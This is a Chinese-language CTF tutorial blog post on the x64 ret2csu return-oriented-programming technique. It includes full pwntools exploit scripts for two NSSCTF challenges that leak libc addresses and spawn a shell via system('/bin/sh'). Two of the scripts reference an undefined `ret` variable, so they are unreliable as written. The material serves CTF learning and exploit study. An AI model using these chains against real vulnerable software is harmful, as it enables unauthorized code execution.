---
title: Pwn-ret2csu
description: pwn-第8部分ret2csu学习
date: 2026-06-21 18:29:40
updated: 2026-07-14 00:00:00
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260621104031_1782038254233_compressed%20(2).jpeg
categories: [pwn]
tags: [ret2csu, pwn, 栈溢出]
---

## ret2csu

::alert{icon="tabler:files" color="var(--c-accent)" title="ret2csu解释"}

[中级ROP - CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/)

::



**ret2csu** 是一种 ROP（Return-Oriented Programming）高级利用技巧。 它的核心原理是：利用动态链接的 ELF 文件中自带的初始化函数 `__libc_csu_init`，从中提取出两段“万能”的代码片段（Gadget），通过精心的栈布局，组合出能够**同时控制 rdi, rsi, rdx 三个参数并调用任意函数**的 ROP 链。

在 IDA 或 objdump 中查看 `__libc_csu_init` 函数的尾部，你会发现两段黄金代码（地址可能会变，但指令结构几乎固定）：

 Gadget 1：疯狂弹栈

```asm
0x4005fa: pop rbx      ; 将栈顶值弹入 rbx
0x4005fb: pop rbp      ; 将栈顶值弹入 rbp
0x4005fc: pop r12      ; 将栈顶值弹入 r12 (关键：决定等下 call 谁)
0x4005fe: pop r13      ; 将栈顶值弹入 r13 (关键：准备传给 edi)
0x400600: pop r14      ; 将栈顶值弹入 r14 (关键：准备传给 rsi)
0x400602: pop r15      ; 将栈顶值弹入 r15 (关键：准备传给 rdx)
0x400604: ret          ; 返回执行下一条指令 (我们要让它跳到 Gadget 2)
```

Gadget 2：寄存器赋值与函数调用

```asm
0x4005e0: mov rdx, r15 ; rdx = r15 (参数 3 搞定！)
0x4005e3: mov rsi, r14 ; rsi = r14 (参数 2 搞定！)
0x4005e6: mov edi, r13d; edi = r13 的低32位 (参数 1 搞定！注意是 32位)
0x4005e9: call QWORD PTR [r12+rbx*8] ; 调用 [r12+rbx*8] 指向的函数
```

我们的目标是执行目标函数（比如 GOT 表里的某个函数），并避免程序崩溃。执行流程如下：

1. **先跳入 Gadget 1**：通过栈溢出，将返回地址覆盖为 Gadget 1 的地址。程序执行一连串的 `pop`，把我们布置在栈上的恶意数据全部吸入寄存器中。
2. **连接 Gadget 2**：Gadget 1 最后的 `ret` 指令，我们将它指向 Gadget 2 的地址。
3. **参数传递**：进入 Gadget 2 后，刚才存入 `r15`, `r14`, `r13` 的值被完美复制到了 `rdx`, `rsi`, `edi` 中。
4. **触发调用 (Call)**：执行 `call [r12+rbx*8]`。
   - 为了方便控制，我们通常在 Gadget 1 阶段把 **`rbx` 设置为 0**。
   - 这样指令就变成了 `call [r12]`。
   - **⚠️ 核心易错点**：这里是 `call [r12]` 而不是 `call r12`。这意味着 `r12` 里面必须存放一个**指针的地址**（比如某个函数的 GOT 表地址，或 bss 段上存有函数地址的指针），而不能直接是函数的实际地址。

## 历史因素

1.导火索：从 x86 到 x64 的架构剧变 (2000s 后期)

在早期的 32 位 (x86) 时代，函数的参数是通过**栈 (Stack)** 来传递的。黑客在进行 ROP 利用时非常轻松：只需把想执行的函数地址和参数顺着栈一路往下摆，程序自然会去栈上取参数。

但当世界步入 64 位 (x64) 时代后，Linux 采用了 System V AMD64 ABI 调用约定。最大的变化是：**前 6 个参数不再放在栈上，而是强制要求放在寄存器里**（依次是 `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`）。

这直接导致 32 位的经典栈溢出打法失效了。黑客如果想调用系统函数（比如 `execve('/bin/sh', 0, 0)`），就必须先想办法把恶意的参数值塞进这几个特定的寄存器里。

---



2. 诞生与黄金时代：寻找“通用 Gadget” (2010s)

为了把数据塞进寄存器，黑客需要寻找类似 `pop rdi; ret` 这样的汇编指令片段（Gadget）。

- `pop rdi` 和 `pop rsi` 通常很容易在程序中找到。
- 但是，控制第三个参数的 **`pop rdx` 极其罕见**。因为编译器在正常编译代码时，很少会生成刚好以 `ret` 结尾的 `pop rdx` 指令流。

**没有 `rdx`，就没法顺利执行系统调用拿 shell，怎么办？**

在 2010 年代初的极客社区中，有人开始将目光投向了每一个 C 语言程序自带的**初始化代码**。无论程序员写了什么代码，GCC 在编译动态链接的 ELF 文件时，都会默认打包进去几个用于环境初始化的内置函数，其中就包括 `__libc_csu_init`（用于处理 C 程序的全局构造函数）。

---

黑客们惊喜地发现，`__libc_csu_init` 的尾部有一段极其完美的连续 `pop` 和寄存器转移指令。因为它**存在于几乎所有的动态链接程序中**，不需要程序本身代码有多复杂，所以它被奉为 x64 漏洞利用的“通用 Gadget” (Universal Gadget)。这套打法正式得名 **ret2csu**，并作为标准操作统治了 CTF 比赛和真实世界的 x64 ROP 漏洞利用长达近十年。

---



3. 终结与落幕：Glibc 2.34 的大清洗 (2021年)

安全防御永远是在攻防对抗中进化的。ret2csu 的泛滥成了安全防护的眼中钉。

随着 2021 年 **Glibc 2.34** 版本的发布，开发者对 C 程序的启动和初始化代码进行了重大重构。他们将这些初始化逻辑整合到了 libc 内部，**直接从默认的编译产物中删除了 `__libc_csu_init` 和 `__libc_csu_fini` 等函数**。

**这意味着什么？**

- 如果你在利用早期的系统（比如 Ubuntu 16.04, 18.04, 20.04），ret2csu 依然是百试百灵的屠龙刀。
- 但如果你面对的是比较新的系统（比如 Ubuntu 22.04 及以上版本），使用新版 GCC 编译出的程序里**已经找不到 `__libc_csu_init` 了**。

ret2csu 从此逐渐退出历史的正面舞台，标志着 x64 基础 ROP 利用一个“无脑套用”时代的结束。

## [HNCTF 2022 WEEK2] ret2csu

::alert{icon="tabler:files" color="var(--c-accent)" title="题目链接"}

https://www.nssctf.cn/problem/2963

::

动画解释

::alert{icon="tabler:files" color="var(--c-accent)" title="动画链接"}

[HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2csu · 工程部Teddy Bear/网络安全 - 码云 - 开源中国](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2csu)

::

### 0x01. 题目分析

#### 1.1 文件信息

```
ret2csu: ELF 64-bit LSB executable, x86-64, dynamically linked
libc.so.6: 题目提供的 libc (Ubuntu GLIBC 2.35-0ubuntu3.1)
```

---



#### 1.2 保护检查

```asm
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

- 无 Canary → 栈溢出不需要绕过
- 无 PIE → 地址固定，直接用
- NX 开启 → 不能执行栈上的 shellcode

---



#### 1.3 源码分析

```c
void vuln() {
    char buf[0x100];
    write(1, "Input:\n", 7);
    read(0, buf, 0x200);    // 栈溢出！buf 只有 0x100，read 读了 0x200
    write(1, "Ok.\n", 4);
    return;
}
```

**漏洞**: `buf` 大小 0x100，`read` 读取 0x200，溢出 0x100 字节。

---



#### 1.4 可用 Gadget

```
pop rdi; ret          → 0x4012B3 ✅
pop rsi; pop r15; ret → 0x4012B1 ✅
pop rdx; ret          → ❌ 没有
```

程序导入了 `write` 和 `read`，但没有 `system`、`execve`、`/bin/sh`。

---

先看看这题的信息

![image-20260621182320667](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260621182909012-1566628094.png)

想要泄露出libc就得知道write参数，但是x64下第三个参数约定是rdx，并没有出现单独的,但是出现了__libc_csu_init函数文件下的寄存器传参

---

### 0x02 核心思路：ret2csu

#### 2.1 为什么需要 ret2csu？

需要调用 `write(1, write@GOT, 8)` 泄露 GOT 表地址，但没有 `pop rdx; ret`，无法设置 write 的第三个参数（长度）。

ret2csu 利用 `__libc_csu_init` 尾部的 gadget 来控制 rdx。

#### 2.2 两个 Gadget

```
Gadget 1 (0x4012AA):  设置参数
    pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

Gadget 2 (0x401290):  调用函数
    mov rdx, r14      → r14 控制 rdx（第3个参数）
    mov rsi, r13      → r13 控制 rsi（第2个参数）
    mov edi, r12d     → r12 控制 edi（第1个参数）
    call [r15]        → r15 控制调用哪个函数
```

#### 2.3 执行流程

```
ret → Gadget 1（pop 设置寄存器）
  → ret → Gadget 2（call [r15] 调用函数）
    → 函数返回后，Gadget 1 的清理代码执行
      → ret → 下一个目标
```

---

### 0x03  三套写法

根据题目条件不同，有三种利用方式。本题给了 libc 和 `pop rdi`，三种都可以用。

---

##### 写法一：盲打 — 泄露地址 + 查 libc 版本（没给 libc 文件）

**适用场景**: 题目没给 libc 文件，但有 `pop rdi; ret`。

**思路**: 泄露多个函数的真实地址 → 去 libc.rip 查版本 → 算出 system 和 "/bin/sh" 偏移。

```python
from pwn import *
context(os='linux', arch='amd64')
r = process('./ret2csu')
#r = remote('node5.anna.nssctf.cn',23664)
elf = ELF('./ret2csu')
libc = ELF('./libc.so.6')

vuln = 0x0401176
gadget_1 = 0x04012AA
gadget_2 = 0x0401290
offset = 0x100+0x8
write_got = elf.got['write']

#part1
#wrint(1,wrint_got,8)rdi = 1; rsi = write_got;rdx = 0x8
payload_1 = offset*b'a'
payload_1 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = write_got,r14->rdx = 0x8
payload_1 += p64(0)+p64(1)+p64(1)+p64(write_got)+p64(0x8)
#call write
payload_1 +=p64(write_got)
payload_1 += p64(gadget_2)
payload_1 += p64(1)*7
payload_1 += p64(vuln)
r.recvuntil(b'Input:\n')
r.send(payload_1)
r.recvuntil(b'Ok.\n')

leak = u64(r.recv(8))
print(f'leak: {hex(leak)}')
print(f'write offset: {hex(libc.symbols["write"])}')
libc.address = leak - libc.symbols['write']
print(f'libc base: {hex(libc.address)}')
system = libc.symbols['system']
print(f'system: {hex(system)}')

bin_sh = next(libc.search(b'/bin/sh\x00'))

#part2

pop_rdi = 0x04012b3
payload_2 = offset*b'a'+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)
r.recvuntil(b'Input:\n')
r.sendline(payload_2)
r.interactive()
```

**关键点**:

- 泄露 `write`、`setbuf`、`read`、`__libc_start_main` 等多个地址，提高匹配准确度
- 用 https://libc.rip/ 或 https://libc.blukat.me/ 查询版本
- 查到版本后下载 libc，计算偏移

---

##### 写法二：直接用附件 libc（给了 libc 文件 + 有 pop_rdi）和写法一一样的

**适用场景**: 题目给了 libc 文件，且有 `pop rdi; ret`。**本题就是这种。**

**思路**: 直接用给的 libc 算偏移，不需要查版本。

```python
from pwn import *
context(os='linux', arch='amd64')
r = process('./ret2csu')
#r = remote('node5.anna.nssctf.cn',23664)
elf = ELF('./ret2csu')
libc = ELF('./libc.so.6')

vuln = 0x0401176
gadget_1 = 0x04012AA
gadget_2 = 0x0401290
offset = 0x100+0x8
write_got = elf.got['write']

#part1
#wrint(1,wrint_got,8)rdi = 1; rsi = write_got;rdx = 0x8
payload_1 = offset*b'a'
payload_1 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = write_got,r14->rdx = 0x8
payload_1 += p64(0)+p64(1)+p64(1)+p64(write_got)+p64(0x8)
#call write
payload_1 +=p64(write_got)
payload_1 += p64(gadget_2)
payload_1 += p64(1)*7
payload_1 += p64(vuln)
r.recvuntil(b'Input:\n')
r.send(payload_1)
r.recvuntil(b'Ok.\n')

leak = u64(r.recv(8))
print(f'leak: {hex(leak)}')
print(f'write offset: {hex(libc.symbols["write"])}')
libc.address = leak - libc.symbols['write']
print(f'libc base: {hex(libc.address)}')
system = libc.symbols['system']
print(f'system: {hex(system)}')

bin_sh = next(libc.search(b'/bin/sh\x00'))

#part2

pop_rdi = 0x04012b3
payload_2 = offset*b'a'+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)
r.recvuntil(b'Input:\n')
r.sendline(payload_2)
r.interactive()
```

**关键点**:

- 本地测试需要用 patchelf 绑定题目 libc 和链接器
- `/bin/sh` 直接从 libc 搜索，不需要写入 BSS
- `ret` gadget 用于栈对齐，避免 movaps 崩溃
- 当然没有`pop rdi；ret`的时候我们也可以去libc文件里边偷一个，利用libc_tools找`pop rdi;ret`远远比第三种写法更加快

或者用HACKED的脚本获取libc连接器

**本地 patchelf 方法**:

```bash
# 提取链接器
wget https://launchpadlibrarian.net/612471225/libc6_2.35-0ubuntu3.1_amd64.deb
dpkg-deb -x libc6_2.35-0ubuntu3.1_amd64.deb extracted/
cp extracted/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 .

# 绑定
cp ret2csu ret2csu_patched
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ret2csu_patched
```

---

##### 写法三：纯 ret2csu — 无 pop_rdi，写 BSS（最通用）

**适用场景**: 程序没有 `pop rdi; ret`，或者没有 `pop rsi; ret` 等 gadget。**全部用 ret2csu 控制参数。**

**思路**: 用 ret2csu 调用 `read(0, BSS, 8)` 把 `"/bin/sh"` 写入 BSS 段，再用 ret2csu 调用 `system(BSS)`。

然后再次通过ret2csu调用控制

```python
from pwn import *
context(os='linux', arch='amd64')
r = process('./ret2csu')
#r = remote('node5.anna.nssctf.cn',23664)
elf = ELF('./ret2csu')
libc = ELF('./libc.so.6')

vuln = 0x0401176
gadget_1 = 0x04012AA
gadget_2 = 0x0401290
offset = 0x100+0x8
write_got = elf.got['write']

#part1
#wrint(1,wrint_got,8)rdi = 1; rsi = write_got;rdx = 0x8
payload_1 = offset*b'a'
payload_1 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = write_got,r14->rdx = 0x8
payload_1 += p64(0)+p64(1)+p64(1)+p64(write_got)+p64(0x8)
#call write
payload_1 +=p64(write_got)
payload_1 += p64(gadget_2)
payload_1 += p64(1)*7
payload_1 += p64(vuln)
r.recvuntil(b'Input:\n')
r.send(payload_1)
r.recvuntil(b'Ok.\n')

leak = u64(r.recv(8))
print(f'leak: {hex(leak)}')
print(f'write offset: {hex(libc.symbols["write"])}')
libc.address = leak - libc.symbols['write']
print(f'libc base: {hex(libc.address)}')
system = libc.symbols['system']
print(f'system: {hex(system)}')


#ret2csu if pop rdi not find
#read(0,0x0404030,0x8)

ret = 0x04011DB
buf_addr = 0x0404030


read_got = elf.got['read']
payload_2= offset*b'a'
payload_2 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = buf_addr,r14->rdx = 0x8
payload_2 += p64(0)+p64(1)+p64(0)+p64(buf_addr)+p64(0x8)
#call read
payload_2 += p64(read_got)
payload_2 += p64(gadget_2)
payload_2 += p64(1)*7
payload_2 += p64(vuln)

r.recvuntil(b'Input:\n')
r.send(payload_2)
r.recvuntil(b'Ok.\n')
r.send(b'/bin/sh\x00')

#part3 
payload_3= offset*b'a'
payload_3 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = buf_addr+8 =system_addr,r14->rdx = 0x8
payload_3 += p64(0)+p64(1)+p64(0)+p64(buf_addr+0x8)+p64(0x8)
#call read
payload_3 += p64(read_got)
payload_3 += p64(gadget_2)
payload_3 += p64(1)*7
payload_3 += p64(vuln)
r.recvuntil(b'Input:\n')
r.send(payload_3)
r.recvuntil(b'Ok.\n')
r.send(p64(system))


#part4
payload_4= offset*b'a'
payload_4 += p64(ret)
payload_4 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = buf_addr+8 =system_addr,r14->rdx = 0x8
payload_4 += p64(0)+p64(1)+p64(buf_addr)+p64(0)+p64(0)
#call system
payload_4 += p64(buf_addr+0x8)
payload_4 += p64(gadget_2)
payload_4 += p64(1)*7
payload_4 += p64(vuln)
r.recvuntil(b'Input:\n')
r.send(payload_4)
r.recvuntil(b'Ok.\n')

r.interactive()
```

**关键点**:

- 不需要任何 `pop rdi`、`pop rsi` 等独立 gadget
- 全部参数通过 ret2csu 的 Gadget 1 pop 设置
- `read(0, BSS, N)` 从 stdin 读取数据写入 BSS
- 把 `"/bin/sh"` 字符串和 `system` 函数地址都写入 BSS
- 最后通过 `call [BSS+8]` 调用 system，参数为 BSS 地址（即 "/bin/sh"）
- **栈对齐**: system 内部使用 `movaps` 指令要求栈 16 字节对齐，Part 4 需要在 payload 前加 `ret` 垫片修正对齐

---

### 0x04.  三种写法对比

|              | 写法一 (盲打)       | 写法二 (本题) | 写法三 (纯 ret2csu)           |
| ------------ | ------------------- | ------------- | ----------------------------- |
| 给 libc 文件 | ❌ 没给              | ✅ 给了        | 不需要                        |
| 有 pop_rdi   | ✅ 有                | ✅ 有          | ❌ 没有                        |
| /bin/sh 来源 | libc.rip 查版本后算 | libc 文件里搜 | 自己写入 BSS                  |
| 难度         | 中等（要查版本）    | 最简单        | 最复杂                        |
| 通用性       | 高                  | 高            | 最高（不依赖任何独立 gadget） |

---

### 0x05.  关键知识点

#### 5.1 ret2csu 适用场景

当程序没有 `pop rdx; ret` gadget，但需要控制 rdx（第3个参数）时使用。

#### 5.2 Gadget 顺序

必须**先 Gadget 1 设置参数，再 Gadget 2 调用函数**。

#### 5.3 recv 注意事项

| 泄露方式            | 输出格式   | 接收方法                      |
| ------------------- | ---------- | ----------------------------- |
| `printf("%p")`      | ASCII 文本 | `int(recvline().strip(), 16)` |
| `write(1, addr, 8)` | 原始二进制 | `u64(recv(8))`                |

#### 5.4 栈对齐（重要！）

Ubuntu 高版本 libc 的 `system()` 内部使用 `movaps` 指令，要求栈 16 字节对齐。如果栈不对齐，会触发 SIGSEGV。

**判断方法**: 如果泄露地址正确、system 地址正确，但调用 system 时崩溃，大概率是栈对齐问题。

**解决方法**: 在调用 system 的 payload 前加一个 `ret` 垫片，多弹 8 字节修正对齐：

```python
# 没有垫片（可能崩溃）
payload += p64(pop_rdi) + p64(bin_sh) + p64(system)

# 有垫片（安全）
payload += p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
```

**注意**: ret2csu 链中如果最后一个 gadget 是 `system`（不返回），也需要加垫片。如果最后一个 gadget 是 `vuln`（返回继续溢出），一般不需要。

#### 5.5 GOT 和 PLT

- **PLT**: 函数跳板代码，处理第一次调用时的懒加载
- **GOT**: 存放函数真实地址的表格，程序调用过函数后自动填充
- 已调用过的函数可以直接 `call [GOT]`，不需要经过 PLT

#### 5.6 本地复现 (patchelf)

```bash
# 从 Ubuntu deb 包提取链接器
wget https://launchpadlibrarian.net/612471225/libc6_2.35-0ubuntu3.1_amd64.deb
dpkg-deb -x libc6_2.35-0ubuntu3.1_amd64.deb extracted/
cp extracted/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 .

# patchelf 绑定
cp ret2csu ret2csu_patched
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ret2csu_patched
```

#### 5.7 libc 版本查询工具

- https://libc.rip/
- https://libc.blukat.me/
- https://libc.nullpt.rs/

输入泄露的函数地址，可匹配 libc 版本，获取函数偏移。

---

## [SWPUCTF 2024 秋季新生赛]出题人你到底干了什么？

::alert{icon="tabler:files" color="var(--c-accent)" title="题目链接"}

https://www.nssctf.cn/problem/5949

::

---

### 0x01 题目信息

#### 1. 保护检查

```asm
$ checksec --file=attachment
    Arch:       amd64-64-little
    RELRO:      Partial RELRO        ← GOT 可写
    Stack:      No canary found      ← 没有栈保护
    NX:         NX enabled           ← 栈不可执行
    PIE:        No PIE (0x3fe000)    ← 基址固定
    Stripped:   No                   ← 符号可见
```

要点：

- **NX 开启** → 不能在栈上跑 shellcode，必须 ROP。
- **No PIE** → 程序基址 `0x400000` 固定，所有 `0x40....` 地址可以直接硬编码进 payload。
- **No canary** → 栈溢出后无需绕过 stack canary。
- **Partial RELRO** → GOT 表可读可写，方便后续如果需要 GOT 注入等手法。

> 出题人还把 ELF 文件名（也就是 RUNPATH）改成了题目的中文路径，IDA/Ghidra 加载可能会卡，加载时记得把 RUNPATH 字段忽略（或下载到根目录再拖进 IDA）。

---

#### 2. 程序行为（main）

```c
// attachment / main @ 0x401176
int main(void) {
    char buf[0x60];
    // 把 _IO_stdin_used+0x8 处的字符串 "听说你会ret2libc,让我康康!\n" 输出
    write(1, "听说你会ret2libc,让我康康!\n", strlen("听说你会ret2libc,让我康康!\n"));
    // 关键漏洞：buf 只有 0x60 字节，但 read 最多读 0x200
    read(0, buf, 0x200);
    return 0;
}
```

`main` 的反汇编关键段：

```asm
401176: push rbp
40117b: mov  rbp, rsp
40117e: sub  rsp, 0x60           ; buf 在 rbp-0x60
...
4011ad: lea  rax, [rbp-0x60]     ; buf
4011b1: mov  edx, 0x200           ; 0x200 字节！
4011b6: mov  rsi, rax
4011b9: mov  edi, 0               ; fd = 0 (stdin)
4011be: call read@plt             ; read(0, buf, 0x200)  ← 栈溢出
4011c3: mov  eax, 0
4011c8: leave
4011c9: ret
```

#### 3. 漏洞

- **栈缓冲区溢出**：缓冲区大小 `0x60`，`read` 长度 `0x200`。
- 偏移：`0x60`（缓冲区）+ `0x8`（保存的 rbp）=`0x68`。
- 没有 canary、没有 PIE，只要控制 RIP 就能 ROP。

---

### 0x02 可用片段 / 工具

#### 1. PLT（程序自带）

| 函数         | 地址       |
| ------------ | ---------- |
| `write@plt`  | `0x401060` |
| `strlen@plt` | `0x401070` |
| `read@plt`   | `0x401080` |

#### 2. GOT（Partial RELRO → 已经被 lazy resolve，可读）

| 函数         | 地址       |
| ------------ | ---------- |
| `write@got`  | `0x404018` |
| `strlen@got` | `0x404020` |
| `read@got`   | `0x404028` |

#### 3. 关键 ROP 片段（来自 `__libc_csu_init`）

```
0x401210 : mov rdx, r14
           mov rsi, r13
           mov edi, r12d
           call [r15 + rbx*8]
           add rbx, 1
           cmp rbx, rbp
           jne 0x401210
           ... (loop exit)
0x40122a : pop rbx
           pop rbp
           pop r12
           pop r13
           pop r14
           pop r15
           ret
0x401233 : pop rdi ; ret                       (RDI 设置 gadget)
0x4011c9 : ret                                 (栈对齐补片)
0x401016 / 0x40101a : ret                       (备用 ret)
```

> 这就是经典的 **`__libc_csu_init` 末段双 gadget**，被命名为 **ret2csu** —— 一旦攻击者能控制 RIP，几乎可以任意 syscall 函数（因为 gadget 1 + gadget 2 可以同时把 RDI/RSI/RDX 设好，再用 `[r15+rbx*8]` 间接 `call`）。

---

### 0x03 ret2csu 基本原理

虽然 attack 这道题的第二阶段（`pop rdi; <"/bin/sh">; ret; system`）其实只需要一个普通的 `pop rdi; ret` 就够了，**ret2csu 在本题里的真正价值是 stage 1：泄露出 libc 基址。**

csu_init 末尾同时有这两段：

```
gadget_1 @ 0x40122a   // 用来「装填」
    pop rbx
    pop rbp
    pop r12
    pop r13
    pop r14
    pop r15
    ret

gadget_2 @ 0x401210   // 用来「执行」
    mov rdx, r14
    mov rsi, r13
    mov edi, r12d
    call [r15 + rbx*8]
    add rbx, 1
    cmp rbx, rbp
    jne gadget_2
    // rbx == rbp 时跳到这里：
    0x401226 : add rsp, 8
    0x40122a : pop rbx
              pop rbp
              pop r12
              pop r13
              pop r14
              pop r15
              ret
```

所以一次「ret2csu 调用链」实际是：

```
[ padding 0x68 ]
[ gadget_1 ]              ; ← 第一段返回地址
[ rbx ]
[ rbp ]                   ; 设 rbp 让 add rbx,1 后 cmp rbx,rbp 立刻成立
[ r12 ]                   ; edi  ← r12
[ r13 ]                   ; rsi  ← r13
[ r14 ]                   ; rdx  ← r14
[ r15 ]                   ; 函数指针地址（注意是地址的地址！）
[ gadget_2 ]              ; ← gadget_1 的 ret 跳转目标
[ padding ×7 ]            ; gadget_2 退出循环后还会再 pop 6 个寄存器 + 8 字节 rsp += 8
[ next gadget / main ]    ; ⑦ 最终回到 main（循环）
```

经典参数约定：

- `rbx = 0` → 调到 `[r15 + 0]` = `[r15]`，GOT 表里的指针。
- `rbp = 1` → 调用后 `rbx` 变 1，与 `rbp` 相等，**只调用一次**就跳出循环。
- `r12`/`r13`/`r14` → 分别给 `edi`/`rsi`/`rdx`。
- `r15` → 指向 GOT 表里的 lazy 解析条目。

---

### 0x04 Exploit 设计

#### Stage 1 — 用 ret2csu 泄露 write 的真实地址

调用 `write(1, write_got, 8)`：把 `write@got` 里已解析过的真实地址打印回来。

```
payload_1 =
    b'a' * 0x68                       # padding
  + p64(0x40122a)                     # gadget_1：6 个 pop + ret
  + p64(0)                            # rbx = 0   → call [r15+0]
  + p64(1)                            # rbp = 1   → call 1 次后退出
  + p64(1)                            # r12 = 1   → edi = 1   (stdout)
  + p64(0x404018)                     # r13       → rsi = write@got
  + p64(0x8)                          # r14       → rdx = 8
  + p64(0x404018)                     # r15       → call [write@got] = write(...)
  + p64(0x401210)                     # gadget_2
  + p64(1) * 7                        # loop 退出后的 7 个 pop 槽
  + p64(0x401176)                     # 最后回到 main 再来一次
```

布局对照：

| 偏移            | 内容                                |
| --------------- | ----------------------------------- |
| `+0x00 ~ +0x67` | 0x68 个 `'a'`                       |
| `+0x68`         | `gadget_1 = 0x40122a`               |
| `+0x70`         | rbx = 0                             |
| `+0x78`         | rbp = 1                             |
| `+0x80`         | r12 = 1 (`edi`)                     |
| `+0x88`         | r13 = 0x404018 (`rsi` = write@got)  |
| `+0x90`         | r14 = 8 (`rdx`)                     |
| `+0x98`         | r15 = 0x404018 (call `[write@got]`) |
| `+0xa0`         | `gadget_2 = 0x401210`               |
| `+0xa8`         | pop rbx (`=1`)                      |
| `+0xb0`         | pop rbp (`=1`)                      |
| `+0xb8`         | pop r12 (`=1`)                      |
| `+0xc0`         | pop r13 (`=1`)                      |
| `+0xc8`         | pop r14 (`=1`)                      |
| `+0xd0`         | pop r15 (`=1`)                      |
| `+0xd8`         | add rsp,8 时跳过的 8 字节（= 1）    |
| `+0xe0`         | return 到 main                      |
| `+0xe8`         | `'\n'` (sendline 自动追加)          |

> 跑完这串 gadget：
>
> 1. RDI=1、RSI=write@got、RDX=8 → `write(1, write_got, 8)` 输出 8 字节；
> 2. `cmp rbx, rbp → 0==1?否 1==1?是 → 跳出循环`，继续把栈上 6 个寄存器 + 8 字节 fill 掉；
> 3. 最后 `ret` 到 `main`，程序再次进入循环，等待我们发第二次 payload。

读出 8 字节 → `leak = u64(r.recvn(8))`，得到 `write` 在 libc 中的真实地址：

```python
libc.address = leak - libc.symbols['write']
print(hex(libc.address))
```

`libc.address` 一旦确定，**所有 libc 内部符号**（`system`、`/bin/sh`、`environ`…）都被 pwntools 自动重定位。

> ⚠️ `libc.address` 必须在 `ELF('./libc.so.6')` 之后做这一减法 —— pwntools 内部对所有偏移都以 `libc.address` 为基准做 `base+offset`，所以 `libc.symbols['system']` 这一行只是「定义符号」、真正打印用的时候要和 `libc.address` 配合。

#### Stage 2 — 经典 ret2libc 调 `system("/bin/sh")`

泄露出 libc 之后本题已经完全可以走通用 `pop rdi; ret` 调 `system("/bin/sh")`，**不再需要 ret2csu**。这里只用了：

```
payload_2 =
    b'a' * 0x68         # padding
  + p64(0x401233)       # pop rdi; ret
  + p64(bin_sh_addr)    # rdi = "/bin/sh"
  + p64(0x4011c9)       # ret (栈对齐到 16)
  + p64(system_addr)    # system("/bin/sh")
```

> **为什么还要一个 `ret`？** glibc 2.31 里 `system` 内部会执行 `do_system → execve`，部分子函数里会跑 `movaps xmm0,[rsp+...]`，对 rsp 的对齐要求是 **16 字节**。从 main 的 ret 一路算下来，`pop rdi`(8) + 一段压栈后栈顶 ≠ 0 mod 16，加一个无副作用 `ret` 摆正即可。这台题没那么严格，但加上肯定不会错。

---

### 0x05 完整 Exploit

```python
#!/usr/bin/env python3
# decode.py – SWPUCTF 2024 「出题人你到底干了什么?」 ret2csu
from pwn import *

context(os='linux', arch='amd64')

# r = process('./attachment')
r  = remote('node6.anna.nssctf.cn', 27512)
libc = ELF('./libc.so.6')
elf  = ELF('./attachment')

# ---------- 关键地址 ----------
gadget_1 = 0x040122A      # __libc_csu_init 末尾 pop rbx..r15; ret
gadget_2 = 0x0401210      # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]...
main     = 0x0401176      # 让我们能再来一次
pop_rdi  = 0x0000000000401233   # pop rdi ; ret
ret_gad  = 0x04011C9      # 空 ret，做栈对齐
write_got = elf.got['write']

offset = 0x60 + 0x8       # buffer + saved rbp

# ---------- Stage 1: ret2csu 泄露 write@libc ----------
payload_1  = offset * b'a' + p64(gadget_1)
# rbx, rbp, r12, r13, r14, r15
payload_1 += p64(0) + p64(1) + p64(1) + p64(write_got) + p64(0x8)
payload_1 += p64(write_got)        # call [r15] = call [write@got] = write
payload_1 += p64(gadget_2)         # 转到 gadget_2 真正执行
payload_1 += p64(1) * 7            # loop 退出后 7 个填充槽
payload_1 += p64(main)             # 回到 main

r.recvline()                       # 吃完 "听说你会ret2libc,让我康康!\n"
r.sendline(payload_1)

leak = u64(r.recvn(8))
log.success(f'write@libc = {leak:#x}')
libc.address = leak - libc.symbols['write']
log.success(f'libc base   = {libc.address:#x}')

# ---------- Stage 2: pop rdi; ret; system("/bin/sh") ----------
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

payload_2  = offset * b'a'
payload_2 += p64(pop_rdi)
payload_2 += p64(bin_sh)
payload_2 += p64(ret_gad)          # 16 字节栈对齐
payload_2 += p64(system)

r.recvline()
r.sendline(payload_2)
r.interactive()
```

执行后预期输出：

```
[+] write@libc = 0x7f1234abcdef
[+] libc base   = 0x7f12349abc00
...
$ id
uid=0(root) gid=0(root) ...
$ cat /flag*
NSSCTF{...}
```

---

### 0x06 回顾与考点

### 这道题考了哪些点？

1. **栈溢出识别**：`sub rsp,0x60` + `read(0, buf, 0x200)` —— 经典的「缓冲区比读入长度小一半都不止」。
2. **ret2csu 操纵 3 个参数的 syscall**：
   - glibc 2.23 之后很多 gadget（`pop rsi; ret` / `pop rdx; ret`）的最后一个直接可用的 `pop rdx` 在非编译器输出的二进制里变得稀少，本题 gadget 链就是把 `rdx` 也一并控制。
